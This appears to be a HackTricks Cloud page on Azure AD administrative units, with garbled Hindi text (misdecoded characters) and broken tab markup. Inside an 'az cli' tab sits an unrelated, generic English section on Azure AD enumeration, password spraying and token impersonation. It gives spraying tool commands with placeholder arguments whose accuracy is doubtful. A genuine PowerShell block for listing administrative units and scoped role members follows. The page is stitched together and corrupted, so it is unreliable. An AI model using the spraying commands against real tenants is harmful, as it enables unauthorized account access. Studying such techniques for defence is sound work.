‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§®‡§ø‡§ï ‡§á‡§ï‡§æ‡§á‡§Ø‡§æ‡§Å ‡§è‡§ï ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ ‡§Æ‡•á‡§Ç ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡•ã ‡§Ü‡§™‡§ï‡•á ‡§∏‡§Ç‡§ó‡§†‡§® ‡§ï‡•á ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§π‡§ø‡§∏‡•ç‡§∏‡•á ‡§™‡§∞ ‡§™‡•ç‡§∞‡§§‡§ø‡§¨‡§Ç‡§ß‡§ø‡§§ ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à‡§Ç ‡§ú‡§ø‡§∏‡•á ‡§Ü‡§™ ‡§™‡§∞‡§ø‡§≠‡§æ‡§∑‡§ø‡§§ ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§Ü‡§™ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§®‡§ø‡§ï ‡§á‡§ï‡§æ‡§á‡§Ø‡•ã‡§Ç ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á [Helpdesk Administrator](https://learn.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#helpdesk-administrator) ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ ‡§ï‡•ã ‡§ï‡•ç‡§∑‡•á‡§§‡•ç‡§∞‡•Ä‡§Ø ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§µ‡§ø‡§∂‡•á‡§∑‡§ú‡•ç‡§û‡•ã‡§Ç ‡§ï‡•ã ‡§∏‡•å‡§Ç‡§™‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡§æ‡§ï‡§ø ‡§µ‡•á ‡§ï‡•á‡§µ‡§≤ ‡§â‡§® ‡§ï‡•ç‡§∑‡•á‡§§‡•ç‡§∞ ‡§Æ‡•á‡§Ç ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡§æ ‡§™‡•ç‡§∞‡§¨‡§Ç‡§ß‡§® ‡§ï‡§∞ ‡§∏‡§ï‡•á‡§Ç‡•§

‡§á‡§∏‡§≤‡§ø‡§è, ‡§Ü‡§™ ‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§®‡§ø‡§ï ‡§á‡§ï‡§æ‡§á‡§Ø‡•ã‡§Ç ‡§ï‡•ã ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ ‡§∏‡•å‡§Ç‡§™ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ ‡§á‡§∏‡§ï‡•á ‡§∏‡§¶‡§∏‡•ç‡§Ø‡•ã‡§Ç ‡§ï‡•ã ‡§Ø‡§π ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ‡§è‡§Ç ‡§π‡•ã‡§Ç‡§ó‡•Ä‡•§

{% tabs %}
{% tab title="az cli" %}
```
```
## AzureAD

Azure Active Directory (Azure AD) is a cloud-based identity and access management service provided by Microsoft. It allows organizations to manage user identities and control access to resources in the Azure cloud environment.

### Enumeration

#### User Enumeration

To enumerate users in Azure AD, you can use the following methods:

1. **Azure AD Graph API**: Use the `users` endpoint to retrieve a list of users in the directory.

   ```plaintext
   GET https://graph.windows.net/{tenant_id}/users?api-version=1.6
   ```

2. **Microsoft Graph API**: Use the `users` endpoint to retrieve a list of users in the directory.

   ```plaintext
   GET https://graph.microsoft.com/v1.0/users
   ```

3. **Azure AD PowerShell Module**: Use the `Get-AzureADUser` cmdlet to retrieve a list of users.

   ```plaintext
   Get-AzureADUser
   ```

#### Group Enumeration

To enumerate groups in Azure AD, you can use the following methods:

1. **Azure AD Graph API**: Use the `groups` endpoint to retrieve a list of groups in the directory.

   ```plaintext
   GET https://graph.windows.net/{tenant_id}/groups?api-version=1.6
   ```

2. **Microsoft Graph API**: Use the `groups` endpoint to retrieve a list of groups in the directory.

   ```plaintext
   GET https://graph.microsoft.com/v1.0/groups
   ```

3. **Azure AD PowerShell Module**: Use the `Get-AzureADGroup` cmdlet to retrieve a list of groups.

   ```plaintext
   Get-AzureADGroup
   ```

### Exploitation

#### Password Spraying

Password spraying is a technique used to bypass account lockout policies by attempting a small number of common passwords against multiple user accounts. This technique can be used to identify weak passwords and gain unauthorized access to user accounts.

To perform password spraying against Azure AD, you can use the following tools:

1. **Spray**: A tool developed by SensePost that automates the password spraying attack against Azure AD.

   ```plaintext
   spray -u <username> -p <password> -t <tenant_id>
   ```

2. **Azure AD Password Spray**: A PowerShell script that automates the password spraying attack against Azure AD.

   ```plaintext
   .\AzureADPasswordSpray.ps1 -Username <username> -Password <password> -TenantId <tenant_id>
   ```

#### Token Impersonation

Token impersonation is a technique used to impersonate a user by stealing their access token. This can be done by exploiting vulnerabilities in the authentication process or by using techniques like token replay attacks.

To perform token impersonation in Azure AD, you can use the following methods:

1. **OAuth 2.0 Authorization Code Grant**: This method allows an attacker to obtain an authorization code and exchange it for an access token.

2. **OAuth 2.0 Implicit Grant**: This method allows an attacker to obtain an access token directly without the need for an authorization code.

3. **OAuth 2.0 Client Credentials Grant**: This method allows an attacker to obtain an access token by using client credentials (client ID and client secret) instead of user credentials.

### Mitigation

To mitigate the risks associated with Azure AD, you can follow these best practices:

1. **Enable Multi-Factor Authentication (MFA)**: Implement MFA to add an extra layer of security to user accounts.

2. **Enforce Strong Password Policies**: Set password policies that require users to use strong and complex passwords.

3. **Regularly Monitor and Review User Accounts**: Monitor user accounts for suspicious activities and review access permissions regularly.

4. **Implement Conditional Access Policies**: Use conditional access policies to control access to Azure AD resources based on specific conditions.

5. **Keep Azure AD PowerShell Modules Updated**: Regularly update the Azure AD PowerShell modules to ensure you have the latest security patches and features.

6. **Educate Users about Phishing Attacks**: Train users to recognize and report phishing attacks to prevent unauthorized access to their accounts.

{% endtab %}
```powershell
# Get Administrative Units
Get-AzureADMSAdministrativeUnit
Get-AzureADMSAdministrativeUnit -Id <id>
# Get ID of admin unit by string
$adminUnitObj = Get-AzureADMSAdministrativeUnit -Filter "displayname eq 'Test administrative unit 2'"
# List the users, groups, and devices affected by the administrative unit
Get-AzureADMSAdministrativeUnitMember -Id <id>
# Get the roles users have over the members of the AU
Get-AzureADMSScopedRoleMembership -Id <id> | fl #Get role ID and role members
```
{% endtab %}
{% endtabs %}

### ‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠

* [https://learn.microsoft.com/en-us/azure/active-directory/roles/administrative-units](https://learn.microsoft.com/en-us/azure/active-directory/roles/administrative-units)

<details>

<summary><strong>‡§π‡•à‡§ï‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞ ‡§≤‡§æ‡§≠ ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç!</strong></summary>

* ‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§Ö‡§™‡§®‡•Ä ‡§ï‡§Ç‡§™‡§®‡•Ä ‡§ï‡•ã **‡§π‡•à‡§ï‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§Æ‡•á‡§Ç ‡§µ‡§ø‡§ú‡•ç‡§û‡§æ‡§™‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç** ‡§Ø‡§æ ‡§Ø‡§¶‡§ø ‡§Ü‡§™ **PEASS ‡§ï‡•á ‡§®‡§µ‡•Ä‡§®‡§§‡§Æ ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ ‡§¶‡•á‡§ñ‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç ‡§Ø‡§æ HackTricks ‡§ï‡•ã PDF ‡§Æ‡•á‡§Ç ‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§° ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç** ‡§§‡•ã [**‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Ç**](https://github.com/sponsors/carlospolop) ‡§¶‡•á‡§ñ‡•á‡§Ç!
* [**‡§Ü‡§ß‡§ø‡§ï‡§æ‡§∞‡§ø‡§ï PEASS ‡§î‡§∞ HackTricks ‡§∏‡•ç‡§µ‡•à‡§ó**](https://peass.creator-spring.com) ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ‡§ï‡§æ ‡§ñ‡•ã‡§ú ‡§ï‡§∞‡•á‡§Ç, ‡§π‡§Æ‡§æ‡§∞‡§æ ‡§µ‡§ø‡§∂‡•á‡§∑ [**NFTs**](https://opensea.io/collection/the-peass-family) ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π
* **üí¨ [**Discord ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Æ‡•á‡§Ç ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç ‡§Ø‡§æ ‡§Æ‡•Å‡§ù‡•á **‡§ü‡•ç‡§µ‡§ø‡§ü‡§∞** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)** ‡§ï‡§æ** **‡§Ö‡§®‡•Å‡§∏‡§∞‡§£** ‡§ï‡§∞‡•á‡§Ç‡•§**
* **‡§Ö‡§™‡§®‡•á ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç,** [**HackTricks**](https://github.com/carlospolop/hacktricks) **‡§î‡§∞** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github repos ‡§Æ‡•á‡§Ç PR ‡§ú‡§Æ‡§æ ‡§ï‡§∞‡§ï‡•á‡•§**

</details>
